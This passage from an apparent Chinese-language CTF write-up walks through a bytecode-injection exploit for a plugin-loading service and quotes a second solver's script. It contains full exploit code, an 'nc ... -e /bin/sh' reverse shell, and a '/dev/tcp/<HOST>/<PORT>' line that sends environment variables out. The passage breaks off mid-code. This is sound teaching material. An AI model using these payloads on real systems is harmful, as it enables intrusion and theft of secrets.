(<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Concatenate the three strings</span><br>    (<span class="hljs-string">&quot;BUILD_STRING&quot;</span>, <span class="hljs-number">3</span>),<br>    <span class="hljs-comment"># Finaly invoke the nc command</span><br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">1</span>)<br>]<br></code></pre></div></td></tr></table></figure><p>Then, we can “assemble” the code:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">exp_bc = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> op, arg <span class="hljs-keyword">in</span> exploit_asm:<br>    exp_bc += <span class="hljs-built_in">bytes</span>([dis.opmap[op], arg])<br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> co_names:<br>    exp_bc += <span class="hljs-string">b&#x27;;&#x27;</span> + name.encode()<br>exp_bc += <span class="hljs-string">b&#x27;;&#x27;</span><br></code></pre></div></td></tr></table></figure><p>可以看出来指令非常的简单, 就是一个字节指令加上一个字节操作数. </p><ul><li>为什么是分号? <strong>是题目源码中识别到有分号时自动把names加入到CodeObject.names</strong> </li><li>还要注意到nc_index, 这是在upload所有的key之后才确定下来的偏移, 因为limit_code的操作数必须是在printable hex的范围之内, 所以干脆把nc命令的这一个字符串和limit_code的参数放到<code>consts[0x30:0x40]</code>的部分. </li><li>这里有个坑(自己作的)就是在第二个for之前也在bc后面加上了分号, 导致co_names的第一个就是空字节串, 所有的idx都不对了, 看到了什么<code>No module named &#39;print&#39;</code>这种神奇报错. </li><li>比较疑惑的是print只是个字符串, 为什么会被CALL_FUNCTION当做是callable? 原来load_name不仅是从names中取出了名称字符串, 而且在local和global两个scope中查找到了对应的item, 这里的print对应的是一个callable item, 自然是可以被CALL_FUNCTION调用的. !!</li></ul><h4 id="填充consts前48个位置"><a href="#填充consts前48个位置" class="headerlink" title="填充consts前48个位置"></a>填充consts前48个位置</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#fill slots</span><br>chunk_size = <span class="hljs-number">12</span><br>num_chunks = <span class="hljs-built_in">len</span>(exp_bc) // chunk_size + <span class="hljs-number">1</span><br><span class="hljs-comment"># num_chunk is 6, limit_code is 6, total is 12, and plugin_log will be 13</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span> - num_chunks):<br>    upload_key(<span class="hljs-string">b&#x27;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;%d&#x27;</span> % (i+<span class="hljs-number">10</span>))<br></code></pre></div></td></tr></table></figure><p>48=0x30, 为了把数据放在<code>\x30</code>中, 先把前面的部分填满, 最后剩下6个位置放入</p><h4 id="Upload-limit-code"><a href="#Upload-limit-code" class="headerlink" title="Upload limit_code"></a>Upload limit_code</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#upload limit_code as serveral plugins in data</span><br>func_idx = <span class="hljs-number">48</span>+<span class="hljs-number">6</span>+<span class="hljs-number">1</span><br>msg_idx = <span class="hljs-number">0x30</span><br>fn_idx = <span class="hljs-number">0x30</span>+<span class="hljs-number">6</span><br>raw_idx = <span class="hljs-number">0x30</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_chunks):<br>    bc = get_plugin_code(i+msg_idx, func_idx, fn_idx, raw_idx)<br>    store(<span class="hljs-string">b&#x27;../plugins/%d&#x27;</span> % i, bc)<br>dump()<br></code></pre></div></td></tr></table></figure><p>这些idx都是事后填上的. 其中raw是随便一个不为空的变量, func_idx是最后一个consts.</p><p>还有一个问题是func_idx已经是55, 后面的command的三个位置已经放不下, 所以执行完六个plugins后才能上传命令. </p><h4 id="Upload-exploit-bytecode-in-chunks"><a href="#Upload-exploit-bytecode-in-chunks" class="headerlink" title="Upload exploit bytecode in chunks"></a>Upload exploit bytecode in chunks</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">exp_bc = exp_bc.ljust(num_chunks*chunk_size, <span class="hljs-string">b&#x27;;&#x27;</span>)<br>exp_block = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp_bc), chunk_size):<br>    exp_block.append(exp_bc[i:i+chunk_size])<br>    upload_key(exp_block[-<span class="hljs-number">1</span>])<br></code></pre></div></td></tr></table></figure><p>把exp分成chunk上传到keys中后, 再上传多个limit_code作为plugin, 用于将每个key中的exp_bc附加到log(其实是<code>./plugins</code>)后面, 拼接成exp. </p><ul><li>要注意的是keys加入consts的时候是通过遍历dict来实现的, <del>所以consts顺序是字典序从大到小</del>.for遍历输出居然是按照<a href="https://docs.python.org/3.10/library/stdtypes.html#dictionary-view-objects">加入的顺序</a>, 测试的时候是直接赋初值然后输出, 结果是字典序. 最后是plugin_log函数object. 这导致每个limit_code中msg的偏移都不一样, 但filename和raw是一样的. </li><li><del>也不对啊, <code>for k in entries</code>这样取出来的是字典中的tuple, 这一个tuple怎么load_const再decode?</del> </li></ul><blockquote><p>python不过关, 做题两行泪: <code>list(dict)</code><a href="https://docs.python.org/3.11/library/stdtypes.html#mapping-types-dict">只会返回key</a>, 而<code>for k in dict</code>同理……….</p><blockquote><p><strong>iter(d)</strong>: Return an iterator over the keys of the dictionary. This is a shortcut for <code>iter(d.keys())</code>.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">&gt;&gt;&gt;d<br>&#123;<span class="hljs-string">&#x27;one&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;two&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;three&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;four&#x27;</span>: <span class="hljs-number">4</span>&#125;<br>&gt;&gt;&gt;<span class="hljs-built_in">list</span>(d)<br>[<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;two&#x27;</span>, <span class="hljs-string">&#x27;three&#x27;</span>, <span class="hljs-string">&#x27;four&#x27;</span>]<br>&gt;&gt;&gt;<span class="hljs-built_in">list</span>(d.values())<br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br></code></pre></div></td></tr></table></figure></blockquote><h4 id="Upload-additional-consts-amp-construct-expl-amp"><a href="#Upload-additional-consts-amp-construct-expl-amp" class="headerlink" title="Upload additional consts &amp; construct ./expl &amp;"></a>Upload additional consts &amp; construct ./expl &amp;</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#used for plugins</span><br>upload_key(<span class="hljs-string">b&#x27;plugins/expl&#x27;</span>)<br><br><span class="hljs-comment">#exec plugins to store exp to plugins/expl</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    plugin(<span class="hljs-string">f&#x27;../plugins/<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>.encode())<br><br><span class="hljs-comment">#used for ./expl</span><br>ip = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>rev_port = <span class="hljs-number">5555</span><br>commmand = <span class="hljs-string">f&quot;nc <span class="hljs-subst">&#123;ip&#125;</span> <span class="hljs-subst">&#123;rev_port&#125;</span> -e /bin/sh&quot;</span>.ljust(chunk_size * <span class="hljs-number">3</span>, <span class="hljs-string">&quot; &quot;</span>)<br>upload_key(commmand[:chunk_size])<br>upload_key(commmand[chunk_size : <span class="hljs-number">2</span> * chunk_size])<br>upload_key(commmand[<span class="hljs-number">2</span> * chunk_size :])<br></code></pre></div></td></tr></table></figure><p>为什么两个upload中间夹个plugin在上面解释了. </p><h4 id="REVERSE-SHELL"><a href="#REVERSE-SHELL" class="headerlink" title="REVERSE SHELL"></a>REVERSE SHELL</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">rev_shl = listen(rev_port)<br>plugin(<span class="hljs-string">f&#x27;expl&#x27;</span>.ljust(<span class="hljs-number">12</span>, <span class="hljs-string">&#x27; &#x27;</span>).encode())<br>rev_shl.sendline(<span class="hljs-string">b&#x27;echo $flag&#x27;</span>)<br>flag = rev_shl.recvline(<span class="hljs-literal">False</span>)<br>log.success(flag)<br></code></pre></div></td></tr></table></figure><p>其实行不通, 不知道容器里面的程序要怎么连接到主机里已在监听的接口. 实际上还要一个公网IP才能反弹, 还没接触过. </p><p>本地是在container里面验证过了exp. </p><p>complete exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> dis<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">store</span>(<span class="hljs-params">key: <span class="hljs-built_in">bytes</span>, data: <span class="hljs-built_in">bytes</span></span>):</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(key) &lt;= <span class="hljs-number">12</span>, <span class="hljs-string">&#x27;store key len&#x27;</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> x: x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>, data.decode()))<br>               ) == <span class="hljs-built_in">len</span>(data) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;data has to be in hex format&quot;</span><br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">4444</span>)<br>    p.send(<span class="hljs-string">b&#x27;S&#x27;</span>)<br>    p.send(key)<br>    p.send(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(data)))<br>    p.send(data)<br>    p.recvuntil(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;key&#125;</span>\n&#x27;</span>.encode(), timeout=<span class="hljs-number">1</span>)<br>    p.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>():</span><br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">4444</span>)<br>    p.send(<span class="hljs-string">b&#x27;D&#x27;</span>)<br>    p.clean()<br>    p.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">plugin</span>(<span class="hljs-params">name</span>):</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(name) == <span class="hljs-number">12</span><br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">4444</span>)<br>    p.send(<span class="hljs-string">b&#x27;P&#x27;</span>)<br>    p.send(name)<br>    p.clean(timeout = <span class="hljs-number">0.3</span>)<br>    p.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_const</span>(<span class="hljs-params">idx</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([dis.opmap[<span class="hljs-string">&#x27;LOAD_CONST&#x27;</span>], idx])<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_name</span>(<span class="hljs-params">idx</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([dis.opmap[<span class="hljs-string">&#x27;LOAD_NAME&#x27;</span>], idx])<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload_key</span>(<span class="hljs-params">key</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(key, <span class="hljs-built_in">str</span>):<br>        key = key.encode()<br>    store(key, <span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_plugin_code</span>(<span class="hljs-params">msg_idx, func_idx, fn_idx, raw_idx</span>):</span><br>    log.success(<span class="hljs-string">f&#x27;four args: <span class="hljs-subst">&#123;msg_idx&#125;</span> <span class="hljs-subst">&#123;func_idx&#125;</span> <span class="hljs-subst">&#123;fn_idx&#125;</span> <span class="hljs-subst">&#123;raw_idx&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> (<br>        <span class="hljs-comment">#load seventh callable to plugin_log + unused 456</span><br>        load_const(func_idx) * <span class="hljs-number">4</span> +<br>        <span class="hljs-comment">#load top three args</span><br>        load_const(raw_idx) + load_const(fn_idx) + load_const(msg_idx) +<br>        <span class="hljs-comment">#call log()</span><br>        <span class="hljs-built_in">bytes</span>([dis.opmap[<span class="hljs-string">&#x27;WITH_EXCEPT_START&#x27;</span>], <span class="hljs-number">0x30</span>])<br>    )<br><br><span class="hljs-comment"># This is the index where we will later store the nc command</span><br>nc_index = <span class="hljs-number">55</span><br>co_names = [<span class="hljs-string">&quot;len&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>, <span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>] <span class="hljs-comment">#, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;]</span><br>exploit_asm = [<br>    <span class="hljs-comment"># Get length of empty list to push 0 on the stack</span><br>    (<span class="hljs-string">&quot;BUILD_LIST&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Use NOP as arg to simplify compiler ?????what is nop?? 不就是压入了一个long类型的0吗, 这个指令不需要参数.</span><br>    (<span class="hljs-string">&quot;GET_LEN&quot;</span>, <span class="hljs-number">0x09</span>),<br>    <span class="hljs-comment"># Invoke print() to push None onto the stack</span><br>    (<span class="hljs-string">&quot;LOAD_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;print&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_FUNCTION&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Import os</span><br>    (<span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;os&quot;</span>)),<br>    <span class="hljs-comment"># Invoke os.system()</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;system&quot;</span>)),<br>    <span class="hljs-comment"># Decode first batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index),<span class="hljs-comment">#load了一个string object, 所以可以在他之上调用decode函数.</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode second batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">1</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode third batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">2</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Concatenate the three strings</span><br>    (<span class="hljs-string">&quot;BUILD_STRING&quot;</span>, <span class="hljs-number">3</span>),<br>    <span class="hljs-comment"># Finaly invoke the nc command</span><br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">1</span>)<br>]<br><br>exp_bc = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> op, arg <span class="hljs-keyword">in</span> exploit_asm:<br>    exp_bc += <span class="hljs-built_in">bytes</span>([dis.opmap[op], arg])<br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> co_names:<br>    exp_bc += <span class="hljs-string">b&#x27;;&#x27;</span> + name.encode()<br>exp_bc += <span class="hljs-string">b&#x27;;&#x27;</span><br><br><span class="hljs-comment">#fill slots</span><br>chunk_size = <span class="hljs-number">12</span><br>num_chunks = <span class="hljs-built_in">len</span>(exp_bc) // chunk_size + <span class="hljs-number">1</span><br><span class="hljs-comment"># num_chunk is 6, limit_code is 6, total is 12, and plugin_log will be 13</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span> - num_chunks):<br>    upload_key(<span class="hljs-string">b&#x27;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;%d&#x27;</span> % (i+<span class="hljs-number">10</span>))<br><br><span class="hljs-comment">#upload limit_code as serveral plugins in data</span><br>func_idx = <span class="hljs-number">48</span>+<span class="hljs-number">6</span>+<span class="hljs-number">1</span><br>msg_idx = <span class="hljs-number">0x30</span><br>fn_idx = <span class="hljs-number">0x30</span>+<span class="hljs-number">6</span><br>raw_idx = <span class="hljs-number">0x30</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_chunks):<br>    bc = get_plugin_code(i+msg_idx, func_idx, fn_idx, raw_idx)<br>    store(<span class="hljs-string">b&#x27;../plugins/%d&#x27;</span> % i, bc)<br>dump()<br><br>exp_bc = exp_bc.ljust(num_chunks*chunk_size, <span class="hljs-string">b&#x27;;&#x27;</span>)<br>exp_block = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp_bc), chunk_size):<br>    exp_block.append(exp_bc[i:i+chunk_size])<br>    upload_key(exp_block[-<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;exp_block:&#x27;</span>)<br><span class="hljs-built_in">print</span>(exp_block)<br><br><span class="hljs-comment">#fn_idx</span><br>upload_key(<span class="hljs-string">b&#x27;plugins/expl&#x27;</span>)<br><br><span class="hljs-comment">#exec plugins to store exp to plugins/expl</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    plugin(<span class="hljs-string">f&#x27;../plugins/<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>.encode())<br><br>ip = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>rev_port = <span class="hljs-number">5555</span><br>commmand = <span class="hljs-string">f&quot;nc <span class="hljs-subst">&#123;ip&#125;</span> <span class="hljs-subst">&#123;rev_port&#125;</span> -e /bin/sh&quot;</span>.ljust(chunk_size * <span class="hljs-number">3</span>, <span class="hljs-string">&quot; &quot;</span>)<br>upload_key(commmand[:chunk_size])<br>upload_key(commmand[chunk_size : <span class="hljs-number">2</span> * chunk_size])<br>upload_key(commmand[<span class="hljs-number">2</span> * chunk_size :])<br><br><span class="hljs-comment"># rev_shl = listen(rev_port)</span><br>plugin(<span class="hljs-string">f&#x27;expl&#x27;</span>.ljust(<span class="hljs-number">12</span>, <span class="hljs-string">&#x27; &#x27;</span>).encode())<br><span class="hljs-comment"># rev_shl.sendline(b&#x27;echo $flag&#x27;)</span><br><span class="hljs-comment"># flag = rev_shl.recvline(False)</span><br><span class="hljs-comment"># log.success(flag)</span><br></code></pre></div></td></tr></table></figure><h4 id="其实还是复杂了"><a href="#其实还是复杂了" class="headerlink" title="其实还是复杂了"></a>其实还是复杂了</h4><p><a href="https://ptr-yudai.hatenablog.com/entry/2022/11/06/163123#Pwn-Pasta-Ordersystem-%EF%B8%8F-14-solves--343-pts">writeup3</a> </p><p>这篇wp使用的方法是用<code>eval()</code>来解析反弹shell命令, 而从consts加载的命令字符串可直接使用<code>BINARY_ADD</code>指令来拼接(当然<code>BUILD_STRING</code>感觉更好). 在exp_bc后面加上了return语句, (应该)可以避免unknown opcode的报错. </p><p>并没有把多个写入操作分成多个文件, 而是</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ptrlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_conn</span>():</span><br>    <span class="hljs-keyword">return</span> Socket(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">4444</span>)<br>    <span class="hljs-comment">#return Socket(&quot;23.88.100.81&quot;, 44463)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">store</span>(<span class="hljs-params">entry, data</span>):</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(entry) &lt;= <span class="hljs-number">12</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x80</span><br>    sock = make_conn()<br>    sock.send(<span class="hljs-string">&#x27;S&#x27;</span>)<br>    sock.send(entry + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">12</span> - <span class="hljs-built_in">len</span>(entry)))<br>    sock.send(<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">len</span>(data) * <span class="hljs-number">2</span>]))<br>    sock.send(data.<span class="hljs-built_in">hex</span>())<br>    <span class="hljs-built_in">print</span>(sock.recvline())<br>    sock.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>():</span><br>    sock = make_conn()<br>    sock.send(<span class="hljs-string">&#x27;D&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(sock.recv())<br>    sock.close()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">plugin</span>(<span class="hljs-params">name</span>):</span><br>    sock = make_conn()<br>    sock.send(<span class="hljs-string">&#x27;P&#x27;</span>)<br>    sock.send(name + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">12</span> - <span class="hljs-built_in">len</span>(name)))<br>    sock.close()<br><span class="hljs-comment"># &#x27;/&#x27; is not valid as filename so use \x2f instead</span><br>pycode = <span class="hljs-string">b&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;env &gt; \\x2fdev\\x2ftcp\\x2f&lt;HOST&gt;\\x2f&lt;PORT&gt;\&quot;&#x27;)&quot;</span><br>pychunks = chunks(pycode, <span class="hljs-number">12</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>code = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">116</span>,<span class="hljs-number">0x00</span>, <span 